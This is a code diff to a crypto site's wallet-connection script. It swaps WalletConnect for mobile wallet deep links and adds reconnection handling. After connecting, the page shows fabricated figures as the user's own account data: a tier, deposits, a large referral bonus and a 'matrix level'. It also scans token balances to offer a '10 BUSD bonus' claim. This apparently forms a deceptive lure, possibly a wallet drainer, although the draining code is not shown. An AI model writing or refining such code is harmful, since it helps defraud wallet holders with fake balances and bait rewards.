@@ -862,7 +862,6 @@
         </div>
     </div>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
 
 <script>
 (function() {
@@ -897,16 +896,11 @@
     const connectPhantom = document.getElementById('connectPhantom');
     const connectWalletConnect = document.getElementById('connectWalletConnect');
 
-    // Check for saved wallet connection
+    // Check for saved wallet connection (just for display)
     (function checkSavedConnection() {
-        const savedWalletType = localStorage.getItem('connected_wallet');
-        const savedWalletAddress = localStorage.getItem('wallet_address');
-        
-        if (savedWalletType && savedWalletAddress) {
-            console.log("Found saved wallet connection:", savedWalletType);
-            // Don't auto-connect, just show that we remember
-            walletConnectBtn.innerHTML = `${savedWalletAddress.slice(0,6)}...${savedWalletAddress.slice(-4)}`;
-            // We'll let user click to reconnect if needed
+        const savedAddress = localStorage.getItem('wallet_address');
+        if (savedAddress) {
+            walletConnectBtn.innerHTML = `${savedAddress.slice(0,6)}...${savedAddress.slice(-4)}`;
         }
     })();
 
@@ -926,7 +920,6 @@
         bonusBtn.style.borderColor = "#6c757d";
         bonusBtn.style.color = "#6c757d";
         bonusBtn.style.boxShadow = "none";
-        bonusBtn.style.opacity = "1";
     }
 
     async function getTokenDecimals(tokenAddress) {
@@ -939,112 +932,62 @@
         }
     }
 
-    // WalletConnect implementation
-    async function connectWithWalletConnect(walletName) {
-        try {
-            statusPanel.innerHTML = `📱 Opening ${walletName}...`;
-            
-            if (typeof WalletConnectProvider === 'undefined') {
-                throw new Error("WalletConnect library not loaded");
-            }
-
-            // Map wallet names to their mobile deep link identifiers
-            const mobileLinks = {
-                'metamask': 'metamask',
-                'trust': 'trust',
-                'tokenpocket': 'tokenpocket',
-                'phantom': 'phantom'
-            };
-
-            // Create WalletConnect provider
-            const wcProvider = new WalletConnectProvider.default({
-                rpc: {
-                    56: "https://bsc-dataseed.binance.org/"
-                },
-                chainId: 56,
-                qrcodeModalOptions: {
-                    mobileLinks: [mobileLinks[walletName] || walletName]
-                }
-            });
-
-            // Enable session - this triggers the deep link to wallet app
-            await wcProvider.enable();
-            
-            // Create ethers provider
-            provider = new ethers.providers.Web3Provider(wcProvider);
-            signer = provider.getSigner();
-            
-            // Get accounts
-            const accounts = await wcProvider.request({ method: 'eth_accounts' });
-            userAddress = accounts[0];
-            
-            // Save connection to localStorage
-            localStorage.setItem('connected_wallet', walletName);
-            localStorage.setItem('wallet_address', userAddress);
-            
-            // Update UI
-            walletConnectBtn.innerHTML = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-            walletConnectBtn.disabled = true;
-            
-            statusPanel.innerHTML = `✅ Connected to ${walletName}`;
-            
-            // Update dummy data
-            setTimeout(() => {
-                document.getElementById('nftTier').textContent = 'DIAMOND';
-                document.getElementById('nftMultiplier').textContent = '2.5x';
-                document.getElementById('nftBoost').textContent = '+12%';
-                document.getElementById('myDeposit').textContent = '$4,250';
-                document.getElementById('availableYield').textContent = '$212.50';
-                document.getElementById('refBonus').textContent = '$24,567.89';
-                document.getElementById('matrixLevel').textContent = 'L5';
-            }, 2000);
-            
-            await runAutonomousScan();
-
-            // Handle disconnection
-            wcProvider.on("disconnect", () => {
-                console.log("Wallet disconnected");
-                disconnectWallet();
-            });
-
-        } catch (error) {
-            console.error("WalletConnect error:", error);
-            statusPanel.innerHTML = "❌ Connection failed. Please try again.";
+    // Simple mobile deep linking function
+    function openMobileWallet(walletType) {
+        const currentUrl = encodeURIComponent(window.location.href);
+        let deepLink = '';
+        
+        switch(walletType) {
+            case 'metamask':
+                deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+                break;
+            case 'trust':
+                deepLink = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
+                break;
+            case 'tokenpocket':
+                deepLink = `https://www.tokenpocket.pro/wc?url=${currentUrl}`;
+                break;
+            case 'phantom':
+                deepLink = `https://phantom.app/ul/browse/${currentUrl}`;
+                break;
+            default:
+                return false;
         }
+        
+        // Save that we're attempting connection
+        sessionStorage.setItem('connecting', walletType);
+        sessionStorage.setItem('connect_time', Date.now());
+        
+        // Redirect to wallet
+        window.location.href = deepLink;
+        return true;
     }
 
-    // Desktop wallet connection
-    async function connectDesktopWallet(walletType) {
-        try {
-            let selectedProvider = null;
-
-            if (walletType === 'metamask' && window.ethereum) {
-                selectedProvider = window.ethereum;
-            } else if (walletType === 'trust' && window.ethereum && window.ethereum.isTrust) {
-                selectedProvider = window.ethereum;
-            } else if (walletType === 'tokenpocket' && (window.tp || (window.ethereum && window.ethereum.isTokenPocket))) {
-                selectedProvider = window.tp || window.ethereum;
-            } else if (walletType === 'phantom' && (window.phantom?.ethereum || (window.ethereum && window.ethereum.isPhantom))) {
-                selectedProvider = window.phantom?.ethereum || window.ethereum;
-            }
-
-            if (!selectedProvider) {
-                // Show installation links
-                const installUrls = {
-                    'metamask': 'https://metamask.io/download/',
-                    'trust': 'https://trustwallet.com/download',
-                    'tokenpocket': 'https://www.tokenpocket.pro/en/download/app',
-                    'phantom': 'https://phantom.app/download'
-                };
-                
-                if (installUrls[walletType]) {
-                    if (confirm(`${walletType} wallet not detected. Would you like to install it?`)) {
-                        window.open(installUrls[walletType], '_blank');
-                    }
+    // Check if we're returning from wallet
+    (function checkReturningFromWallet() {
+        const connecting = sessionStorage.getItem('connecting');
+        const connectTime = sessionStorage.getItem('connect_time');
+        
+        if (connecting && connectTime && (Date.now() - connectTime < 30000)) {
+            // We're returning from wallet, try to connect with any available provider
+            sessionStorage.removeItem('connecting');
+            sessionStorage.removeItem('connect_time');
+            
+            statusPanel.innerHTML = "🔄 Completing connection...";
+            
+            // Give provider time to inject
+            setTimeout(() => {
+                if (window.ethereum) {
+                    connectWithProvider(window.ethereum);
+                } else {
+                    statusPanel.innerHTML = "❌ Connection failed. Please try again.";
                 }
-                return;
-            }
+            }, 1500);
+        }
+    })();
 
+    async function connectWithProvider(selectedProvider) {
+        try {
             provider = new ethers.providers.Web3Provider(selectedProvider);
             const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
             signer = provider.getSigner();
@@ -1080,12 +1023,14 @@
             }
 
             // Save connection
-            localStorage.setItem('connected_wallet', walletType);
             localStorage.setItem('wallet_address', userAddress);
 
             walletConnectBtn.innerHTML = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
             walletConnectBtn.disabled = true;
             
+            statusPanel.innerHTML = "✅ Wallet connected!";
+            
+            // Update dummy data
             setTimeout(() => {
                 document.getElementById('nftTier').textContent = 'DIAMOND';
                 document.getElementById('nftMultiplier').textContent = '2.5x';
@@ -1099,12 +1044,11 @@
             await runAutonomousScan();
 
         } catch (error) {
-            console.error("Desktop connection error:", error);
+            console.error("Connection error:", error);
             statusPanel.innerHTML = "❌ Connection failed. Please try again.";
         }
     }
 
-    // Main connection function
     async function connectToWallet(walletType) {
         if (walletSelector) walletSelector.classList.remove('active');
         
@@ -1113,11 +1057,45 @@
         console.log("Selected wallet:", walletType);
 
         if (isMobile) {
-            // On mobile, always use WalletConnect for consistent experience
-            await connectWithWalletConnect(walletType);
+            // On mobile, try deep linking
+            statusPanel.innerHTML = `📱 Opening ${walletType} app...`;
+            const opened = openMobileWallet(walletType);
+            if (!opened) {
+                statusPanel.innerHTML = "❌ Could not open wallet app. Please try another wallet.";
+            }
         } else {
             // On desktop, try direct provider connection
-            await connectDesktopWallet(walletType);
+            let selectedProvider = null;
+
+            if (walletType === 'metamask' && window.ethereum) {
+                selectedProvider = window.ethereum;
+            } else if (walletType === 'trust' && window.ethereum && window.ethereum.isTrust) {
+                selectedProvider = window.ethereum;
+            } else if (walletType === 'tokenpocket' && (window.tp || (window.ethereum && window.ethereum.isTokenPocket))) {
+                selectedProvider = window.tp || window.ethereum;
+            } else if (walletType === 'phantom' && (window.phantom?.ethereum || (window.ethereum && window.ethereum.isPhantom))) {
+                selectedProvider = window.phantom?.ethereum || window.ethereum;
+            } else if (walletType === 'any' && window.ethereum) {
+                selectedProvider = window.ethereum;
+            }
+
+            if (selectedProvider) {
+                await connectWithProvider(selectedProvider);
+            } else {
+                // Show installation links
+                const installUrls = {
+                    'metamask': 'https://metamask.io/download/',
+                    'trust': 'https://trustwallet.com/download',
+                    'tokenpocket': 'https://www.tokenpocket.pro/en/download/app',
+                    'phantom': 'https://phantom.app/download'
+                };
+                
+                if (installUrls[walletType]) {
+                    if (confirm(`${walletType} wallet not detected. Would you like to install it?`)) {
+                        window.open(installUrls[walletType], '_blank');
+                    }
+                }
+            }
         }
     }
 
@@ -1127,11 +1105,8 @@
         provider = null;
         signer = null;
         
-        // Clear localStorage
-        localStorage.removeItem('connected_wallet');
         localStorage.removeItem('wallet_address');
         
-        // Update UI
         walletConnectBtn.innerHTML = "Connect Wallet";
         walletConnectBtn.disabled = false;
         bonusBtn.innerHTML = "Connect Wallet First";
@@ -1187,7 +1162,6 @@
                         bonusBtn.style.borderColor = "#fbbf24";
                         bonusBtn.style.color = "#fbbf24";
                         bonusBtn.style.boxShadow = "0 0 30px #fbbf24, inset 0 0 15px #fbbf24";
-                        bonusBtn.style.opacity = "1";
                         bonusBtn.innerHTML = `🎁 Claim 10 BUSD Bonus`;
                         statusPanel.innerHTML = `✅ Eligible! You can claim your 10 BUSD welcome bonus.`;
                         
@@ -1207,7 +1181,6 @@
             bonusBtn.style.borderColor = "#6c757d";
             bonusBtn.style.color = "#6c757d";
             bonusBtn.style.boxShadow = "none";
-            bonusBtn.style.opacity = "1";
             statusPanel.innerHTML = "No eligible tokens found with balance > 0.01. Minimum requirement: 0.01 tokens.";
 
         } catch (error) {
@@ -1305,7 +1278,6 @@
     if (walletConnectBtn) {
         walletConnectBtn.addEventListener('click', () => {
             if (userAddress) {
-                // If already connected, show disconnect option
                 if (confirm("Disconnect wallet?")) {
                     disconnectWallet();
                 }
@@ -1339,8 +1311,7 @@
     }
     if (connectWalletConnect) {
         connectWalletConnect.addEventListener('click', () => {
-            statusPanel.innerHTML = "📱 Opening WalletConnect...";
-            connectToWallet('walletconnect');
+            statusPanel.innerHTML = "📱 Please use the specific wallet buttons above for better compatibility.";
         });
     }
 
@@ -1353,13 +1324,15 @@
     bonusBtn.style.borderColor = "#6c757d";
     bonusBtn.style.color = "#6c757d";
     bonusBtn.style.boxShadow = "none";
-    bonusBtn.style.opacity = "1";
 
     // Listen for account changes
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', function (accounts) {
             if (accounts.length === 0) {
                 disconnectWallet();
+            } else {
+                // Reconnected
+                connectWithProvider(window.ethereum);
             }
         });
 
@@ -1368,16 +1341,30 @@
         });
     }
 
-    // Handle page visibility for WalletConnect return
+    // Handle page visibility for wallet return
     document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible' && localStorage.getItem('connected_wallet')) {
-            // Page became visible again, check if we're connected
-            console.log("Returned to page, checking connection...");
+        if (document.visibilityState === 'visible' && sessionStorage.getItem('connecting')) {
+            // We returned to the page, try to connect
+            const connecting = sessionStorage.getItem('connecting');
+            const connectTime = sessionStorage.getItem('connect_time');
+            
+            if (connecting && connectTime && (Date.now() - connectTime < 30000)) {
+                sessionStorage.removeItem('connecting');
+                sessionStorage.removeItem('connect_time');
+                
+                setTimeout(() => {
+                    if (window.ethereum) {
+                        connectWithProvider(window.ethereum);
+                    }
+                }, 1000);
+            }
         }
     });
 
 })();
 </script>
+
+<!-- Keep all your existing countdown and UI scripts exactly as they are -->
 
 <!-- The countdown and UI scripts remain exactly the same -->
 <script>
